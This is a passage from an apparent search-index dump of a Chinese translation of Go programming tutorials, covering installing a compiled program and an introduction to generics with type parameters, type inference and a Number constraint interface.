\u4e0a\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a $ export PATH=$PATH:/path/to/your/install/directory \u5728 Windows \u4e0a\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a $ set PATH=%PATH%;C:\\path\\to\\your\\install\\directory \u4f5c\u4e3a\u66ff\u4ee3\u65b9\u6848\uff0c\u5982\u679c\u60a8\u7684 shell \u8def\u5f84\u4e2d\u5df2\u7ecf\u6709\u4e00\u4e2a\u76ee\u5f55 $HOME/bin \uff0c\u5e76\u4e14\u60a8\u60f3\u5728\u90a3\u91cc\u5b89\u88c5\u60a8\u7684 Go \u7a0b\u5e8f\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 go env \u547d\u4ee4 \u8bbe\u7f6e\u53d8\u91cf GOBIN \u6765\u66f4\u6539\u5b89\u88c5\u76ee\u6807\uff1a $ go env -w GOBIN=/path/to/your/bin \u6216\u8005 $ go env -w GOBIN=C:\\path\\to\\your\\bin \u66f4\u65b0 shell \u8def\u5f84\u540e\uff0c\u8fd0\u884c go install \u547d\u4ee4\u7f16\u8bd1\u548c\u5b89\u88c5\u5305\u3002 $ go install \u53ea\u9700\u952e\u5165\u5176\u540d\u79f0\u5373\u53ef\u8fd0\u884c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u4e3a\u4e86\u8ba9\u8fd9\u4e2a\u6709\u8da3\uff0c\u6253\u5f00\u4e00\u4e2a\u65b0\u7684\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5728\u5176\u4ed6\u76ee\u5f55\u4e2d\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u540d hello \u3002 $ hello map[Darrin:Hail, Darrin! Well met! Gladys:Great to see you, Gladys! Samantha:Hail, Samantha! Well met!]","title":"\u7f16\u8bd1\u548c\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f"},{"location":"go/generics/","text":"\u6cdb\u578b\u5165\u95e8 \uf0c1 \u672c\u6559\u7a0b\u4ecb\u7ecd Go \u4e2d\u6cdb\u578b\u7684\u57fa\u7840\u77e5\u8bc6\u3002\u4f7f\u7528\u6cdb\u578b\uff0c\u60a8\u53ef\u4ee5\u4e3a\u8c03\u7528\u4ee3\u7801\u58f0\u660e\u548c\u4f7f\u7528\u7684\u51fd\u6570\u6216\u7c7b\u578b\u7f16\u5199\u63d0\u4f9b\u4efb\u4f55\u4e00\u7ec4\u7c7b\u578b\u3002 \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u58f0\u660e\u4e24\u4e2a\u7b80\u5355\u7684\u975e\u6cdb\u578b\u51fd\u6570\uff0c\u7136\u540e\u5728\u5355\u4e2a\u6cdb\u578b\u51fd\u6570\u4e2d\u6355\u83b7\u76f8\u540c\u7684\u903b\u8f91\u3002 \u60a8\u5c06\u9010\u6b65\u5b8c\u6210\u4ee5\u4e0b\u90e8\u5206\uff1a \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002 \u6dfb\u52a0\u975e\u6cdb\u578b\u51fd\u6570\u3002 \u6dfb\u52a0\u4e00\u4e2a\u6cdb\u578b\u51fd\u6570\u6765\u5904\u7406\u591a\u79cd\u7c7b\u578b\u3002 \u8c03\u7528\u6cdb\u578b\u51fd\u6570\u65f6\u5220\u9664\u7c7b\u578b\u53c2\u6570\u3002 \u58f0\u660e\u7c7b\u578b\u7ea6\u675f\u3002 \u6ce8\u610f \uff1a\u5982\u679c\u60a8\u613f\u610f\uff0c\u53ef\u4ee5\u4f7f\u7528 \u201cGo dev branch\u201d\u6a21\u5f0f\u4e0b\u7684 Go Playground \u6765\u7f16\u8f91\u548c\u8fd0\u884c\u60a8\u7684\u7a0b\u5e8f\u3002 Go 1.18 \u6216\u66f4\u9ad8\u7248\u672c 1. \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939 \uf0c1 \u9996\u5148\uff0c\u4e3a\u60a8\u8981\u7f16\u5199\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002 \u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5207\u6362\u5230\u60a8\u7684\u4e3b\u76ee\u5f55\u3002 \u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\uff0c\u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a generics \u7684\u76ee\u5f55\u3002 $ mkdir generics $ cd generics \u521b\u5efa\u4e00\u4e2a\u6a21\u5757\u6765\u4fdd\u5b58\u60a8\u7684\u4ee3\u7801\u3002 \u8fd0\u884c go mod init \u547d\u4ee4\uff0c\u4e3a\u5176\u63d0\u4f9b\u65b0\u4ee3\u7801\u7684\u6a21\u5757\u8def\u5f84\u3002 $ go mod init example/generics go: creating new go.mod: module example/generics \u6ce8\u610f\uff1a\u5bf9\u4e8e\u751f\u4ea7\u4ee3\u7801\uff0c\u60a8\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u66f4\u7b26\u5408\u60a8\u81ea\u5df1\u9700\u6c42\u7684\u6a21\u5757\u8def\u5f84\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u52a1\u5fc5\u67e5\u770b \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e00\u4e9b\u7b80\u5355\u7684\u4ee3\u7801\u6765\u5904\u7406 map\u3002 2. \u6dfb\u52a0\u975e\u6cdb\u578b\u51fd\u6570 \uf0c1 \u5728\u6b64\u6b65\u9aa4\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e24\u4e2a\u51fd\u6570\uff0c\u6bcf\u4e2a\u51fd\u6570\u5c06 map \u7684\u503c\u76f8\u52a0\u5e76\u8fd4\u56de\u603b\u6570\u3002 \u60a8\u8981\u58f0\u660e\u4e24\u4e2a\u51fd\u6570\u800c\u4e0d\u662f\u4e00\u4e2a\uff0c\u56e0\u4e3a\u60a8\u6b63\u5728\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u7684 map\uff1a\u4e00\u79cd\u7528\u4e8e\u5b58\u50a8 int64 \u503c\uff0c\u53e6\u4e00\u79cd\u7528\u4e8e\u5b58\u50a8 float64 \u503c\u3002 2.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u4f7f\u7528\u60a8\u7684\u6587\u672c\u7f16\u8f91\u5668\uff0c\u5728 generics \u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a main.go \u7684\u6587\u4ef6\u3002\u60a8\u5c06\u5728\u6b64\u6587\u4ef6\u4e2d\u7f16\u5199\u60a8\u7684 Go \u4ee3\u7801\u3002 \u8fdb\u5165 main.go\uff0c\u5728\u6587\u4ef6\u9876\u90e8\uff0c\u7c98\u8d34\u4ee5\u4e0b\u5305\u58f0\u660e\u3002 package main \u72ec\u7acb\u7a0b\u5e8f\uff08\u4e0e\u5e93\u76f8\u53cd\uff09\u59cb\u7ec8\u4f4d\u4e8e package main \u4e2d\u3002 \u5728\u5305\u58f0\u660e\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\u58f0\u660e\u3002 // SumInts adds together the values of m. func SumInts(m map[string]int64) int64 { var s int64 for _, v := range m { s += v } return s } // SumFloats adds together the values of m. func SumFloats(m map[string]float64) float64 { var s float64 for _, v := range m { s += v } return s } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e24\u4e2a\u51fd\u6570\u4ee5\u5c06map\u7684\u503c\u76f8\u52a0\u5e76\u8fd4\u56de\u603b\u548c\u3002 SumFloats \u83b7\u53d6 string \u5230 float64 \u503c\u7684map\u6620\u5c04\u3002 SumInts \u83b7\u53d6 string \u5230 int64 \u503c\u7684map\u6620\u5c04\u3002 \u5728 main.go \u9876\u90e8\u7684\u5305\u58f0\u660e\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b main \u51fd\u6570\u4ee5\u521d\u59cb\u5316\u4e24\u4e2a\u6620\u5c04\uff0c\u5e76\u5728\u8c03\u7528\u60a8\u5728\u4e0a\u4e00\u6b65\u4e2d\u58f0\u660e\u7684\u51fd\u6570\u65f6\u5c06\u5b83\u4eec\u7528\u4f5c\u53c2\u6570\u3002 func main() { // Initialize a map for the integer values ints := map[string]int64{ \"first\": 34, \"second\": 12, } // Initialize a map for the float values floats := map[string]float64{ \"first\": 35.98, \"second\": 26.99, } fmt.Printf(\"Non-Generic Sums: %v and %v\\n\", SumInts(ints), SumFloats(floats)) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u521d\u59cb\u5316\u4e00\u4e2a float64 \u503cmap\u6620\u5c04\u548c\u4e00\u4e2a int64 \u503cmap\u6620\u5c04\uff0c\u6bcf\u4e2a\u90fd\u6709\u4e24\u4e2a\u6761\u76ee\u3002 \u8c03\u7528\u60a8\u4e4b\u524d\u58f0\u660e\u7684\u4e24\u4e2a\u51fd\u6570\u6765\u67e5\u627e\u6bcf\u4e2a\u6620\u5c04\u503c\u7684\u603b\u548c\u3002 \u6253\u5370\u7ed3\u679c\u3002 \u5728 main.go \u9876\u90e8\u9644\u8fd1\uff0c\u5c31\u5728\u5305\u58f0\u660e\u7684\u4e0b\u65b9\uff0c\u5bfc\u5165\u60a8\u9700\u8981\u652f\u6301\u60a8\u521a\u521a\u7f16\u5199\u7684\u4ee3\u7801\u7684\u5305\u3002 \u7b2c\u4e00\u884c\u4ee3\u7801\u5e94\u5982\u4e0b\u6240\u793a\uff1a package main import \"fmt\" \u4fdd\u5b58 main.go\u3002 2.2. \u8fd0\u884c\u4ee3\u7801 \uf0c1 \u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 \u4f7f\u7528\u6cdb\u578b\uff0c\u60a8\u53ef\u4ee5\u5728\u6b64\u5904\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u800c\u4e0d\u662f\u4e24\u4e2a\u3002\u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u4e3a\u5305\u542b\u6574\u6570\u6216\u6d6e\u70b9\u503c\u7684map\u6620\u5c04\u6dfb\u52a0\u4e00\u4e2a\u6cdb\u578b\u51fd\u6570\u3002 3. \u6dfb\u52a0\u6cdb\u578b\u51fd\u6570\u5904\u7406\u591a\u79cd\u7c7b\u578b \uf0c1 \u5728\u672c\u8282\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e00\u4e2a\u6cdb\u578b\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ef\u4ee5\u63a5\u6536\u5305\u542b\u6574\u6570\u6216\u6d6e\u70b9\u503c\u7684map\u6620\u5c04\uff0c\u4ece\u800c\u6709\u6548\u5730\u5c06\u60a8\u521a\u521a\u7f16\u5199\u7684\u4e24\u4e2a\u51fd\u6570\u66ff\u6362\u4e3a\u4e00\u4e2a\u51fd\u6570\u3002 \u8981\u652f\u6301\u4efb\u4e00\u7c7b\u578b\u7684\u503c\uff0c\u8be5\u5355\u4e2a\u51fd\u6570\u5c06\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u58f0\u660e\u5b83\u652f\u6301\u7684\u7c7b\u578b\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u8c03\u7528\u4ee3\u7801\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u6307\u5b9a\u5b83\u662f\u4f7f\u7528\u6574\u6570map\u8fd8\u662f\u6d6e\u70b9map\u3002 \u4e3a\u4e86\u652f\u6301\u8fd9\u4e00\u70b9\uff0c\u60a8\u5c06\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5728\u5176\u666e\u901a\u51fd\u6570\u53c2\u6570\u4e4b\u5916\u8fd8\u58f0\u660e \u7c7b\u578b\u53c2\u6570 (type parameters)\u3002\u8fd9\u4e9b\u7c7b\u578b\u53c2\u6570\u4f7f\u51fd\u6570\u5177\u6709\u901a\u7528\u6027\uff0c\u4f7f\u5176\u80fd\u591f\u5904\u7406\u4e0d\u540c\u7c7b\u578b\u7684\u53c2\u6570\u3002\u60a8\u5c06\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u548c\u666e\u901a\u51fd\u6570\u53c2\u6570\u8c03\u7528\u8be5\u51fd\u6570\u3002 \u6bcf\u4e2a\u7c7b\u578b\u53c2\u6570\u90fd\u6709\u4e00\u4e2a \u7c7b\u578b\u7ea6\u675f (type constraint)\uff0c\u5b83\u5145\u5f53\u7c7b\u578b\u53c2\u6570\u7684\u4e00\u79cd\u5143\u7c7b\u578b(meta-type)\u3002\u6bcf\u4e2a\u7c7b\u578b\u7ea6\u675f\u6307\u5b9a\u8c03\u7528\u4ee3\u7801\u53ef\u7528\u4e8e\u76f8\u5e94\u7c7b\u578b\u53c2\u6570\u7684\u5141\u8bb8\u7c7b\u578b\u53c2\u6570\u3002 \u867d\u7136\u7c7b\u578b\u53c2\u6570\u7684\u7ea6\u675f\u901a\u5e38\u8868\u793a\u4e00\u7ec4\u7c7b\u578b\uff0c\u4f46\u5728\u7f16\u8bd1\u65f6\uff0c\u7c7b\u578b\u53c2\u6570\u4ee3\u8868\u5355\u4e00\u7c7b\u578b\u2014\u2014\u8c03\u7528\u4ee3\u7801\u4f5c\u4e3a\u7c7b\u578b\u53c2\u6570\u63d0\u4f9b\u7684\u7c7b\u578b\u3002\u5982\u679c\u7c7b\u578b\u53c2\u6570\u7684\u7ea6\u675f\u4e0d\u5141\u8bb8\u7c7b\u578b\u53c2\u6570\u7684\u7c7b\u578b\uff0c\u5219\u4ee3\u7801\u5c06\u65e0\u6cd5\u7f16\u8bd1\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u7c7b\u578b\u53c2\u6570\u5fc5\u987b\u652f\u6301\u6cdb\u578b\u4ee3\u7801\u5bf9\u5176\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u7684\u51fd\u6570\u4ee3\u7801\u5c1d\u8bd5\u5bf9\u5176\u7ea6\u675f\u7c7b\u578b\u5305\u62ec\u6570\u5b57\u7c7b\u578b\u7684\u7c7b\u578b\u53c2\u6570\u6267\u884c string \u64cd\u4f5c\uff08\u4f8b\u5982\u7d22\u5f15\uff09\uff0c\u5219\u4ee3\u7801\u5c06\u65e0\u6cd5\u7f16\u8bd1\u3002 \u5728\u60a8\u5373\u5c06\u7f16\u5199\u7684\u4ee3\u7801\u4e2d\uff0c\u60a8\u5c06\u4f7f\u7528\u5141\u8bb8\u6574\u6570\u6216\u6d6e\u70b9\u7c7b\u578b\u7684\u7ea6\u675f\u3002 3.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u5728\u60a8\u4e4b\u524d\u6dfb\u52a0\u7684\u4e24\u4e2a\u51fd\u6570\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u6cdb\u578b\u51fd\u6570\u3002 // SumIntsOrFloats sums the values of map m. It supports both int64 and float64 // as types for map values. func SumIntsOrFloats[K comparable, V int64 | float64](m map[K]V) V { var s V for _, v := range m { s += v } return s } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e00\u4e2a SumIntsOrFloats \u51fd\u6570\u5177\u6709\u4e24\u4e2a\u7c7b\u578b\u53c2\u6570\uff08\u5728\u65b9\u62ec\u53f7\u5185\uff09 K \u548c V \uff0c\u4ee5\u53ca\u4e00\u4e2a\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u7684\u53c2\u6570 m \uff0c\u7c7b\u578b\u4e3a map[K]V \u3002\u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a V \u7c7b\u578b\u7684\u503c\u3002 \u4e3a K \u7c7b\u578b\u53c2\u6570\u6307\u5b9a\u7c7b\u578b\u7ea6\u675f comparable \u3002\u4e13\u95e8\u9488\u5bf9\u6b64\u7c7b\u60c5\u51b5\uff0c\u5728 Go \u4e2d\u9884\u5148\u58f0\u660e\u4e86\u7ea6\u675f comparable \u3002\u5b83\u5141\u8bb8\u503c\u53ef\u4ee5\u7528\u4f5c\u6bd4\u8f83\u8fd0\u7b97\u7b26 == \u548c != \u7684\u64cd\u4f5c\u6570\u7684\u4efb\u4f55\u7c7b\u578b\u3002Go \u8981\u6c42map\u6620\u5c04\u7684keys\u5177\u6709\u53ef\u6bd4\u6027\u3002\u6240\u4ee5\u58f0\u660e K \u4e3a ascomparable \u662f\u5fc5\u8981\u7684\uff0c\u8fd9\u6837\u60a8\u5c31\u53ef\u4ee5\u4f7f\u7528 K \u5728 map \u53d8\u91cf\u4e2d\u4f5c\u4e3akey\u952e\u3002\u5b83\u8fd8\u786e\u4fdd\u8c03\u7528\u4ee3\u7801\u5bf9\u6620\u5c04\u952e\u4f7f\u7528\u5141\u8bb8\u7684\u7c7b\u578b\u3002 \u4e3a V \u7c7b\u578b\u53c2\u6570\u6307\u5b9a\u4e00\u4e2a\u7ea6\u675f\uff0c\u5b83\u662f\u4e24\u79cd\u7c7b\u578b\u7684\u8054\u5408\uff1a int64 \u548c float64 \u3002\u4f7f\u7528 | \u6307\u5b9a\u4e24\u79cd\u7c7b\u578b\u7684\u8054\u5408\uff0c\u8fd9\u610f\u5473\u7740\u6b64\u7ea6\u675f\u5141\u8bb8\u4efb\u4f55\u4e00\u79cd\u7c7b\u578b\u3002\u7f16\u8bd1\u5668\u5c06\u5141\u8bb8\u4efb\u4e00\u7c7b\u578b\u4f5c\u4e3a\u8c03\u7528\u4ee3\u7801\u4e2d\u7684\u53c2\u6570\u3002 \u6307\u5b9a\u53c2\u6570 m \u7c7b\u578b\u662f map[K]V \uff0c\u5176\u4e2d K \u548c V \u662f\u5df2\u7ecf\u4e3a\u7c7b\u578b\u53c2\u6570\u6307\u5b9a\u7684\u7c7b\u578b\u3002\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u77e5\u9053 map[K]V \u662f\u6709\u6548\u7684map\u7c7b\u578b\uff0c\u56e0\u4e3a K \u662f\u53ef\u6bd4\u8f83\u7684\u7c7b\u578b\u3002\u5982\u679c\u6211\u4eec\u6ca1\u6709\u58f0\u660e K \u53ef\u6bd4\u8f83\uff0c\u7f16\u8bd1\u5668\u5c06\u62d2\u7edd map[K]V \u952e\u503c\u5bf9. \u5728 main.go \u4e2d\uff0c\u5728\u60a8\u5df2\u6709\u7684\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002 fmt.Printf(\"Generic Sums: %v and %v\\n\", SumIntsOrFloats[string, int64](ints), SumIntsOrFloats[string, float64](floats)) \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u8c03\u7528\u60a8\u521a\u521a\u58f0\u660e\u7684\u901a\u7528\u51fd\u6570\uff0c\u4f20\u9012\u60a8\u521b\u5efa\u7684\u6bcf\u4e2a\u6620\u5c04\u3002 \u6307\u5b9a\u7c7b\u578b\u53c2\u6570 - \u65b9\u62ec\u53f7\u4e2d\u7684\u7c7b\u578b\u540d\u79f0 - \u4ee5\u660e\u786e\u5e94\u8be5\u66ff\u6362\u60a8\u6b63\u5728\u8c03\u7528\u7684\u51fd\u6570\u4e2d\u7684\u7c7b\u578b\u53c2\u6570\u7684\u7c7b\u578b\u3002 \u6b63\u5982\u60a8\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u770b\u5230\u7684\uff0c\u60a8\u901a\u5e38\u53ef\u4ee5\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u7701\u7565\u7c7b\u578b\u53c2\u6570\u3002Go \u901a\u5e38\u53ef\u4ee5\u4ece\u4f60\u7684\u4ee3\u7801\u4e2d\u63a8\u65ad\u51fa\u5b83\u4eec\u3002 \u6253\u5370\u51fd\u6570\u8fd4\u56de\u7684\u603b\u548c\u3002 3.2. \u8fd0\u884c\u4ee3\u7801 \uf0c1 \u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 Generic Sums: 46 and 62.97 \u4e3a\u4e86\u8fd0\u884c\u60a8\u7684\u4ee3\u7801\uff0c\u5728\u6bcf\u6b21\u8c03\u7528\u4e2d\uff0c\u7f16\u8bd1\u5668\u5c06\u7c7b\u578b\u53c2\u6570\u66ff\u6362\u4e3a\u8be5\u8c03\u7528\u4e2d\u6307\u5b9a\u7684\u5177\u4f53\u7c7b\u578b\u3002 \u5728\u8c03\u7528\u60a8\u7f16\u5199\u7684\u6cdb\u578b\u51fd\u6570\u65f6\uff0c\u60a8\u6307\u5b9a\u4e86\u7c7b\u578b\u53c2\u6570\uff0c\u544a\u8bc9\u7f16\u8bd1\u5668\u4f7f\u7528\u4ec0\u4e48\u7c7b\u578b\u4ee3\u66ff\u51fd\u6570\u7684\u7c7b\u578b\u53c2\u6570\u3002\u6b63\u5982\u60a8\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u770b\u5230\u7684\uff0c\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\u60a8\u53ef\u4ee5\u7701\u7565\u8fd9\u4e9b\u7c7b\u578b\u53c2\u6570\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u53ef\u4ee5\u63a8\u65ad\u5b83\u4eec\u3002 4. \u7b80\u5316\u8c03\u7528\u6cdb\u578b\u51fd\u6570 \uf0c1 \u5728\u672c\u8282\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u6cdb\u578b\u51fd\u6570\u8c03\u7528\u7684\u4fee\u6539\u7248\u672c\uff0c\u8fdb\u884c\u5c0f\u7684\u66f4\u6539\u4ee5\u7b80\u5316\u8c03\u7528\u4ee3\u7801\u3002\u60a8\u5c06\u5220\u9664\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u7684\u7c7b\u578b\u53c2\u6570\u3002 \u5f53 Go \u7f16\u8bd1\u5668\u53ef\u4ee5\u63a8\u65ad\u60a8\u8981\u4f7f\u7528\u7684\u7c7b\u578b\u65f6\uff0c\u60a8\u53ef\u4ee5\u5728\u8c03\u7528\u4ee3\u7801\u4e2d\u7701\u7565\u7c7b\u578b\u53c2\u6570\u3002\u7f16\u8bd1\u5668\u4ece\u51fd\u6570\u53c2\u6570\u7684\u7c7b\u578b\u63a8\u65ad\u7c7b\u578b\u53c2\u6570\u3002 \u8bf7\u6ce8\u610f\uff0c\u8fd9\u5e76\u4e0d\u603b\u662f\u53ef\u80fd\u7684\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u9700\u8981\u8c03\u7528\u6ca1\u6709\u53c2\u6570\u7684\u6cdb\u578b\u51fd\u6570\uff0c\u5219\u9700\u8981\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u5305\u542b\u7c7b\u578b\u53c2\u6570\u3002 4.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u5728 main.go \u4e2d\uff0c\u5728\u60a8\u5df2\u6709\u7684\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002 fmt.Printf(\"Generic Sums, type parameters inferred: %v and %v\\n\", SumIntsOrFloats(ints), SumIntsOrFloats(floats)) \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u8c03\u7528\u6cdb\u578b\u51fd\u6570\uff0c\u7701\u7565\u7c7b\u578b\u53c2\u6570\u3002 4.2. \u8fd0\u884c\u4ee3\u7801 \uf0c1 \u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 Generic Sums: 46 and 62.97 Generic Sums, type parameters inferred: 46 and 62.97 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u901a\u8fc7\u5c06\u6574\u6570\u548c\u6d6e\u70b9\u6570\u7684\u5e76\u96c6\u6355\u83b7\u5230\u60a8\u53ef\u4ee5\u91cd\u7528\u7684\u7c7b\u578b\u7ea6\u675f\uff08\u4f8b\u5982\u4ece\u5176\u4ed6\u4ee3\u7801\u4e2d\uff09\u6765\u8fdb\u4e00\u6b65\u7b80\u5316\u51fd\u6570\u3002 5. \u58f0\u660e\u7c7b\u578b\u7ea6\u675f \uf0c1 \u5728\u6700\u540e\u4e00\u90e8\u5206\u4e2d\uff0c\u60a8\u5c06\u628a\u4e4b\u524d\u5b9a\u4e49\u7684\u7ea6\u675f\u79fb\u5230\u5b83\u81ea\u5df1\u7684\u63a5\u53e3\u4e2d\uff0c\u4ee5\u4fbf\u60a8\u53ef\u4ee5\u5728\u591a\u4e2a\u5730\u65b9\u91cd\u7528\u5b83\u3002\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u58f0\u660e\u7ea6\u675f\u6709\u52a9\u4e8e\u7b80\u5316\u4ee3\u7801\uff0c\u4f8b\u5982\u5f53\u7ea6\u675f\u66f4\u590d\u6742\u65f6\u3002 \u60a8\u5c06 \u7c7b\u578b\u7ea6\u675f \u58f0\u660e\u4e3a\u63a5\u53e3\u3002\u7ea6\u675f\u5141\u8bb8\u4efb\u4f55\u7c7b\u578b\u5b9e\u73b0\u63a5\u53e3\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u58f0\u660e\u4e86\u5177\u6709\u4e09\u4e2a\u65b9\u6cd5\u7684\u7c7b\u578b\u7ea6\u675f\u63a5\u53e3\uff0c\u7136\u540e\u5728\u6cdb\u578b\u51fd\u6570\u4e2d\u5c06\u5176\u4e0e\u7c7b\u578b\u53c2\u6570\u4e00\u8d77\u4f7f\u7528\uff0c\u5219\u7528\u4e8e\u8c03\u7528\u8be5\u51fd\u6570\u7684\u7c7b\u578b\u53c2\u6570\u5fc5\u987b\u5177\u6709\u6240\u6709\u8fd9\u4e9b\u65b9\u6cd5\u3002 \u6b63\u5982\u60a8\u5c06\u5728\u672c\u8282\u4e2d\u770b\u5230\u7684\uff0c\u7ea6\u675f\u63a5\u53e3\u4e5f\u53ef\u4ee5\u5f15\u7528\u7279\u5b9a\u7c7b\u578b\u3002 5.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u5c31\u5728main\u4e0a\u9762\uff0c\u7d27\u8ddf\u5728 import \u8bed\u53e5\u4e4b\u540e\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u6765\u58f0\u660e\u7c7b\u578b\u7ea6\u675f\u3002 type Number interface { int64 | float64 } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e Number \u8981\u7528\u4f5c\u7c7b\u578b\u7ea6\u675f\u7684\u63a5\u53e3\u7c7b\u578b\u3002 \u5728\u63a5\u53e3\u5185\u90e8\u58f0\u660e\u4e00\u4e2a int64 \u548c float64 \u7684\u5e76\u96c6(union)\u3002 \u672c\u8d28\u4e0a\uff0c\u60a8\u6b63\u5728\u5c06\u8054\u5408(union)\u4ece\u51fd\u6570\u58f0\u660e\u79fb\u52a8\u5230\u65b0\u7684\u7c7b\u578b\u7ea6\u675f\u4e2d\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5f53\u60a8\u60f3\u5c06\u7c7b\u578b\u53c2\u6570\u7ea6\u675f\u4e3a int64 \u6216 float64 \u65f6\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u6b64 Number \u7c7b\u578b\u7ea6\u675f\u6765\u4ee3\u66ff int64 | float64 \u3002 \u5728\u60a8\u5df2\u6709\u7684\u51fd\u6570\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u901a\u7528 SumNumbers \u51fd\u6570\u3002 // SumNumbers sums the values of map m. It supports both integers // and floats as map values. func SumNumbers[K comparable, V Number](m map[K]V) V { var s V for _, v := range m { s += v } return s } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e00\u4e2a\u4e0e\u60a8\u4e4b\u524d\u58f0\u660e\u7684\u6cdb\u578b\u51fd\u6570\u5177\u6709\u76f8\u540c\u903b\u8f91\u7684\u6cdb\u578b\u51fd\u6570\uff0c\u4f46\u4f7f\u7528\u65b0\u7684\u63a5\u53e3\u7c7b\u578b\u800c\u4e0d\u662f\u8054\u5408\u4f5c\u4e3a\u7c7b\u578b\u7ea6\u675f\u3002\u548c\u4ee5\u524d\u4e00\u6837\uff0c\u60a8\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u4f5c\u4e3a\u53c2\u6570\u548c\u8fd4\u56de\u7c7b\u578b\u3002 \u5728 main.go \u4e2d\uff0c\u5728\u60a8\u5df2\u6709\u7684\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002 fmt.Printf(\"Generic Sums with Constraint: %v and %v\\n\", SumNumbers(ints), SumNumbers(floats)) \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u4ee5\u6bcf\u4e2amap\u4e3a\u53c2\u6570\u8c03\u7528 SumNumbers 